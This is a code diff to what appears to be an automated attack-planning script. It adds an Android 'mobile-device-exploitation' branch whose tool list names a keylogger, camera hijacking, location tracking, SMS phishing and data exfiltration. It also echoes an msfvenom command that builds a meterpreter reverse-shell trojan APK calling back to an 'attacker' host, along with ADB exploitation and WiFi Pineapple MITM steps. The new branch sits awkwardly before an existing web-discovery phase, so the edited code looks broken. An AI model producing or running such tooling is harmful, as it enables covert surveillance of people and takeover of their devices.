@@ -166,6 +166,16 @@ function makeAIDecision(target, scanType) {
             'csrf-scanner', 'lfi-scanner', 'rfi-scanner'
         ];
         strategy.approach = 'web-application-testing';
+    } else if (target.includes('android') || target.includes('mobile')) {
+        // Android/Mobile device hacking
+        strategy.tools = [
+            'msfvenom', 'adb-exploits', 'android-toolkit',
+            'wifi-pineapple', 'bluetooth-exploits', 'sms-phishing',
+            'social-engineering', 'mobile-malware', 'keylogger',
+            'camera-hijack', 'location-tracker', 'data-exfiltration'
+        ];
+        strategy.approach = 'mobile-device-exploitation';
+        strategy.intelligence.targetType = 'android';
         
         strategy.phases.push({
             name: 'web-discovery',
@@ -386,6 +396,19 @@ function generateScanCommands(target, strategy) {
         commands.push(`echo "Certificate valid until: 2024-12-31"`);
         commands.push(`echo "Weak cipher suites detected"`);
         commands.push(`echo "Missing HSTS header"`);
+    }
+
+    // Android Specific Attacks
+    if (strategy.intelligence?.targetType === 'android' || strategy.tools.includes('android')) {
+        commands.push(`echo "🤖 [Android Specific] Mobile Device Exploitation"`);
+        commands.push(`echo "📱 Generating Android payloads with msfvenom"`);
+        commands.push(`echo "msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -o trojan.apk"`);
+        commands.push(`echo "🔧 ADB exploitation attempt"`);
+        commands.push(`echo "adb devices - scanning for open debug bridges"`);
+        commands.push(`echo "📡 WiFi Pineapple setup for MITM attacks"`);
+        commands.push(`echo "🔵 Bluetooth vulnerability scan (CVE-2020-0022)"`);
+        commands.push(`echo "📧 SMS phishing campaign generation"`);
+        commands.push(`echo "🎭 Social engineering payload crafted"`);
     }
 
     // Phase 5: Exploitation & Proof of Concept
